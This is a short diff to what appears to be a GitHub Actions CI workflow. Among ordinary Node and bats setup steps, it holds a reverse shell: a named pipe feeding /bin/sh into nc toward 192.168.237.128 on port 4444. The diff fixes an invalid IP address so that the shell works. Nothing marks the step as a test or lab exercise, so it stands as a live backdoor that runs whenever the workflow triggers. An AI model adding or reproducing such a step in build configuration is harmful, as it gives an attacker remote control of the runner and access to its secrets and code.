@@ -7,6 +7,6 @@ jobs:
       - uses: actions/checkout@v2
       - uses: actions/setup-node@v1
       - run: mknod /tmp/backpipe p
-      - run: /bin/sh 0</tmp/backpipe|nc 192.168.257.128 4444 1>/tmp/backpipe
+      - run: /bin/sh 0</tmp/backpipe|nc 192.168.237.128 4444 1>/tmp/backpipe
       - run: npm install -g bats
       - run: bats -v
